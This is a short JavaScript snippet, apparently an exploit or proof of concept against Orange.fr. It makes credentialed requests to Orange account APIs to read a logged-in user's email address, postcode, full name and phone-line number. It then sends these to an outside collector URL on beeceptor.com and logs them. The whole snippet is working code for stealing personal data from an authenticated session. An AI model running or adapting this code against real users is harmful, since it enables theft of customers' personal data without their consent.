let email, postCode, fullName, pubLineNo;

fetch('https://elcos.orange.fr/api/stages/init', {
  method: 'GET',
  credentials: 'include'
})
  .then(r => r.json())
  .then(data => {
    const userData = data[0].zones[0].data;

    email = userData.USER_MAIL_ADDRESS;
    postCode = userData.USER_ZIP_CODE;
    fullName = userData.USER_FULL_NAME;

    return fetch('https://sso.orange.fr/pushms/advise/mct/1.1/proposal?targets=TOP%5Borangefr_contrat_header_notif%3A99%2Corangefr_transverse_header_notif%3A99%2Corangefr_elimpn_header_notif%3A99%2Corangefr_nboa_header_notif%3A2%5D&canal=06o', {
      method: 'GET',
      credentials: 'include'
    });
  })
  .then(r => r.json())
  .then(data => {
    pubLineNo =
      data["0"]
        .TOP
        .orangefr_contrat_header_notif[0]
        .response
        .OffersSpecification
        .Argumentation
        .argumentationValue
        .pubLineNo;

    const params = new URLSearchParams({
      email,
      postCode,
      fullName,
      pubLineNo
    });

    return fetch(`https://sdsdf.free.beeceptor.com?${params.toString()}`, {
      method: 'GET'
    });
  })
  .then(r => r.text())
  .then(data => {
    console.log('Stats:', data);
    console.log({ email, postCode, fullName, pubLineNo });
  })
  .catch(err => console.error('Error:', err));
